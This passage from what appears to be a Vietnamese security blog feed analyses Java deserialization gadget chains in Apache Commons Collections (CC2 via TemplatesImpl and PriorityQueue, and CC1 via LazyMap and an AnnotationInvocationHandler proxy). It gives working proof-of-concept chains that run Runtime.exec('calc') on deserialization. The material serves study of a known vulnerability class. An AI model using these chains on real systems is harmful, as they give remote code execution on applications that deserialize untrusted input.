class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(templates),</span><br><span class="line">                invokerTransformer</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( chainedTransformer);</span><br><span class="line">        transformingComparator.compare(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//priorityQueue.siftDownUsingComparator(0,templates);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Full chain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(templates),</span><br><span class="line">                invokerTransformer</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(templates);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>( chainedTransformer);</span><br><span class="line">        <span class="comment">//transformingComparator.compare(null, null);</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mot-vai-kien-thuc-can-nam&quot;&gt;&lt;a href=&quot;#Mot-vai-kien-thuc-can-nam&quot; class=&quot;headerlink&quot; title=&quot;Một vài kiến thức cần nắm&quot;&gt;&lt;/a&gt;Một vài kiế</summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/categories/Java/Deserialization/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/tags/Deserialization/"/>
    
    <category term="Commons Collections" scheme="https://rayinaw.github.io/tags/Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>Phân tích chuỗi Commons Collections 1 với LazyMap</title>
    <link href="https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/"/>
    <id>https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/</id>
    <published>2022-12-14T20:48:35.000Z</published>
    <updated>2022-12-15T16:19:44.802Z</updated>
    
    <content type="html"><![CDATA[<p>Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết này mình sẽ thực hiện deserialization theo hướng của lớp LazyMap.</p><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><h3 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h3><p>Phần đuôi của chuỗi này cũng tương tự như chuỗi trước là <code>InvokerTransformer</code>, mình sẽ không phân tích lại lớp này. Như bài viết trước đã nói chúng ta cần tìm lớp gọi đến phương thức transform của lớp InvokerTransformer.</p><p><code>Ctrl + Chuột trái</code> click vào phương thức transform</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ClassesCallMethodTransform.png"></p><p>Phương thức này được sử dụng ở LazyMap.get()</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/LazyMap-Get.png"></p><p>Xem <code>factory</code> là gì nào~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Lớp này sử dụng Overloading cho hàm tạo và hàm decorate, và ở đây có kiểu truyền vào cho factory là Transformer hoặc Factory, do đó chúng ta có thể truyền vào factory một Transformer rồi cho factory.transform(Runtime.getRuntime) như chain trước.</p><p>Ở bài viết trước, có một vấn đề gặp phải là lớp Runtime không implements serialize và không thể điều khiển được tham số ở trong hàm setValue. Và chúng ta đã thấy được cái tiện lợi của lớp ChainedTransformer và ConstantTransformer. Nên mình sẽ sử dụng lại đoạn này để bỏ đi một vài bước không cần thiết.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        lazyMap.get(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/LazyMap-Get.png"></p><p>Đã mở được máy tính. Tuy nhiên như thế vẫn chưa đủ, chúng ta cần tìm lớp nào gọi đến phương thức LazyMap.get(). Và với chuỗi này, chúng ta sẽ tập trung đến lớp <code>AnnotationInvocationHandler</code>.</p><h3 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/AnnotationInvocationHandler-invoke.png"></p><p>Trong hàm invoke của <code>AnnotationInvocationHandler</code> có dòng thực hiện phương thức get <code>Object var6 = this.memberValues.get(var4);</code>:</p><ul><li><code>this.memberValues</code> ở đây là một map, chúng ta có thể cast nó sang LazyMap để lợi dụng LazyMap.get().</li><li>Như bài viết trước đã nói, lớp này là lớp kiểu default và constructor cũng là default nên chúng ta phải khởi tạo nó bằng Reflection.</li></ul><p>Đoạn code khởi tạo một AnnotationInvocationHandler, chỉ dừng ở việc khởi tạo và mình chưa làm những bước tiếp theo.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Object.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//InvocationHandler aihObject = (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Lớp này đã implements Serializable và có phương thức readObject(). Nên điều mà chúng ta cần tiếp theo là làm sao để lớp này thực hiện hàm invoke() trong phương thức readObject(). Và để thực hiện điều này chúng ta có thể sử dụng Proxy động.</p><h3 id="Dynamic-Proxy"><a href="#Dynamic-Proxy" class="headerlink" title="Dynamic Proxy"></a>Dynamic Proxy</h3><p>Các phương thức gốc của lớp gốc đã được ghi đè bằng proxy, khi chúng ta thực hiện một phương thức của lớp đó thông qua proxy, proxy sẽ gọi đến hàm invoke rồi invoke phương thức của lớp này. Để hiểu thêm thì các bạn hãy đọc thêm về Dynamic Proxy trong Java.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tạo một InvocationHandler để điều khiển phương thức của lớp gốc.</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">aihObject</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"><span class="comment">//Tạo một proxyMap để gọi phương thức</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br></pre></td></tr></table></figure><p>Bây giờ khi chúng ta gọi bất kì phương thức nào của proxyMap tương ứng với phương thức của lazyMap, nó sẽ gọi đến phương thức invoke và thực thi lazyMap.get() như mình đã phân tích ở trên.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span 